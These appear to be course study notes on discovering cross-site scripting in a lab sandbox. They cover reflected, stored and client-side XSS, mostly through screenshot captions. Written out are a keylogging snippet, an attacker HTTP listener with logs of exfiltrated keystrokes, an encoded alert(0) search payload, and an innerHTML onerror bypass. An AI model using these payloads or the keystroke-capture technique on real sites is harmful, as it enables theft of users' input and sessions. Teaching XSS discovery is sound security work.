# Module 5: Cross-Site Scripting Introduction and Discovery

## Introduction to the Sandbox

### Accessing the Sandbox

_Start the VPN and start the VM. Add the IP to hosts file._

### Understanding the Sandbox

_Explaining the sandbox webpage._

## JavaScript Basics for Offensive Uses

### Syntax Overview

_Function example_

{% code overflow="wrap" %}
```javascript
01  function processData(data) {
02    data.items.forEach(item => {
03      console.log(item)
04    });
05  }
06
07  let foo = {
08    items: [
09      "Hello",
10      "Zdravo",
11      "Hola"
12    ]
13  }
14
15  processData(foo)
```
{% endcode %}

### Useful APIs

<figure><img src="../../../.gitbook/assets/20094dc9baed9b6df575673cfb6b74c2-xss_logging_values.png" alt=""><figcaption><p><em>Logging inputs</em></p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/b9242be15cc3fd2bdbe6b72e739ba4f5-xss_logKey.png" alt=""><figcaption><p>logKey function</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/df657d089803e60aa996555a4ca1d193-xss_key_strokes.png" alt=""><figcaption><p>Capturing Key stroke</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/7621b9c0c313107b672683b49046f8e6-xss_typing_into_eval.png" alt=""><figcaption><p>Typing into Eval</p></figcaption></figure>

_Starting HTTP listener_

```bash
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

<figure><img src="../../../.gitbook/assets/01837014bc01c08fcecec07ff8080e34-xss_fetch.png" alt=""><figcaption><p>Using fetch</p></figcaption></figure>

_HTTP Server Log_

```bash
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.16.174.4 - - [11/Aug/2021 19:15:53] "GET /hello HTTP/1.1" 404 -
```

_Original Keylogging Payload_

```javascript
function logKey(event){
	console.log(event.key)
}

document.addEventListener('keydown', logKey);
```

<figure><img src="../../../.gitbook/assets/437dcc360d5e8fd18daf0e3c5e7f8b53-xss_send_keystrokes.png" alt=""><figcaption><p>Sending keystrokes back</p></figcaption></figure>

_HTTP Server Log_

{% code overflow="wrap" %}
```bash
...
192.168.121.101 - - [11/Aug/2021 19:23:39] "GET /k?key=I HTTP/1.1" 404 -
192.168.121.101 - - [11/Aug/2021 19:23:39] code 404, message File not found
192.168.121.101 - - [11/Aug/2021 19:23:39] "GET /k?key= HTTP/1.1" 404 -
192.168.121.101 - - [11/Aug/2021 19:23:39] code 404, message File not found
192.168.121.101 - - [11/Aug/2021 19:23:39] "GET /k?key=l HTTP/1.1" 404 -
192.168.121.101 - - [11/Aug/2021 19:23:40] code 404, message File not found
192.168.121.101 - - [11/Aug/2021 19:23:40] "GET /k?key=i HTTP/1.1" 404 -
192.168.121.101 - - [11/Aug/2021 19:23:40] code 404, message File not found
192.168.121.101 - - [11/Aug/2021 19:23:40] "GET /k?key=k HTTP/1.1" 404 -
192.168.121.101 - - [11/Aug/2021 19:23:40] code 404, message File not found
192.168.121.101 - - [11/Aug/2021 19:23:40] "GET /k?key=e HTTP/1.1" 404 -
...
```
{% endcode %}

## Cross-Site Scripting - Discovery

### Reflected Server XSS

_Often found in locations where user input is sent via GET parameters._

<figure><img src="../../../.gitbook/assets/cd804f35779bc9bed8420412b35fc09b-xss_search_for_offsec.png" alt=""><figcaption><p>Searchin for "offsec"</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/3aa80dd4b3853bcef647f295b417874f-xss_inspecting_offsec.png" alt=""><figcaption><p>Inspecting "offsec"</p></figcaption></figure>

_It's inside a \<div> tag, it may be vulnerable. Testing with HTML injection has less potential for error — this doesn't always mean we can inject JavaScript but is a great indicator._

<figure><img src="../../../.gitbook/assets/c38829acbca8dde334c16cfa848cfcb2-xss_html_search_injection.png" alt=""><figcaption><p>Injecting HTML to Search</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/e6db736a3b67e25722bc21c5471781c4-xss_search_alert.png" alt=""><figcaption><p>Search Alert box</p></figcaption></figure>

_Encoded search payload_

<pre class="language-uri"><code class="lang-uri"><strong>search.php?s=%3Cscript%3Ealert(0)%3C/script%3E
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/839a8c89014b6ca0a38b39a08fbd6253-xss_search_alert_render.png" alt=""><figcaption><p>XSS rendered on Victim - Search</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/0a907278cd84c5a6e8cb523e88229c74-xss_reviewing_http_res.png" alt=""><figcaption><p>Reviewing HTTP Response in Burp Suite</p></figcaption></figure>

### Stored Server XSS

<figure><img src="../../../.gitbook/assets/3b768510a2088cd48f02b3aac2fded97-xss_leaving_comment.png" alt=""><figcaption><p>Leaving a comment</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/e79d52fa2a8641eae2ff3fee6dab98d4-xss_inspect_blog.png" alt=""><figcaption><p>Blog Comment Inspection</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/a8e0d4819141afdc59d271e5d9301f2c-xss_sanatized_comment.png" alt=""><figcaption><p>Sanitized Comment</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/109917b5a07b464eeab9142361bed148-xss_inspect_blog_comment.png" alt=""><figcaption><p>Inspecting Sanitized Comment</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/2f76c64e69690741ac7fa58ad2b68d22-xss_raw_html_blog.png" alt=""><figcaption><p>Raw HTML of Comment</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/8dc7bd6bea49768f8da2a8e9a31a76f0-xss_h1_username_blog.png" alt=""><figcaption><p>H1 in Username</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/b2409253b19b4e09b88c3c5d96266028-xss_rendred_h1_blog.png" alt=""><figcaption><p>Rendered H1</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/54e12cf9768bc3cf73346236bc6f2d83-xss_blog_xss_payload.png" alt=""><figcaption><p>XSS payload in Blog Comment</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/3c6ff6afb0096c7630fd86fb3d477058-xss_exploit_target_stored.png" alt=""><figcaption><p>Executing XSS Payload using Target User Browser</p></figcaption></figure>

### Reflected Client XSS

<figure><img src="../../../.gitbook/assets/534a8898c6caccd13434673067ff78f1-xss_survey_home.png" alt=""><figcaption><p>Survey Home Page</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/469260e639fd5db73090aad1f67b9e30-xss_survey_html_injection.png" alt=""><figcaption><p>Survey HTML Injection</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/3758e6d9ce4744aee8cc958b5d1ee1d5-xss_req_in_network.png" alt=""><figcaption><p>Finding Request in the Network Tools</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/32c93a5de4f2d0004d35ad8a57b6a3bd-xss_review_response_payload.png" alt=""><figcaption><p>Viewing the Response Payload</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/06af987c803283f6dea421e1efb5c5d7-xss_review_surveyjs.png" alt=""><figcaption><p>Reviewing Survey.js</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/ad4e65e6ae7bdb8e6609bb2f35200201-xss_payload_client_fail.png" alt=""><figcaption><p>Payload not executing in Client XSS</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/87a0da7d64fffa2a393b6fd95e6b9f9f-xss_review_injection_point.png" alt=""><figcaption><p>Reviewing Injection Point</p></figcaption></figure>

_Mozilla's innerHTML Bypass_

```markup
const name = "<img src='x' onerror='alert(1)'>";
el.innerHTML = name; // shows the alert
```

<figure><img src="../../../.gitbook/assets/de953b819a8da726b2e37c5a857023a3-xss_innerHTML_exploit.png" alt=""><figcaption><p>Exploiting with Mozilla's Bypass</p></figcaption></figure>

### Stored Client XSS

<figure><img src="../../../.gitbook/assets/900769315d2ded28bab65698bcb39c2a-xss_survey_answers.png" alt=""><figcaption><p>Summary of Answers</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/05651f3853ee0457666b524f5c0f99b5-xss_html_in_survey.png" alt=""><figcaption><p>HTML in Survey</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/896892cac9bae046f89c835467c343ac-xss_rendered_html.png" alt=""><figcaption><p>Rendered HTML in Survey</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/025a1f0c2c689253dfe13e71dcc1b07c-xss_in_survey_stored.png" alt=""><figcaption><p>XSS Payload in Survey</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/9b5cb6820c36eaf6fd3f50876a05ecb0-xss_alert_on_result.png" alt=""><figcaption><p>Alert Box on Result Page</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/24021796c4d4a9894fc1d55383802a72-xss_survey_alert_victim.png" alt=""><figcaption><p>Alert Box in Victim's Browser</p></figcaption></figure>
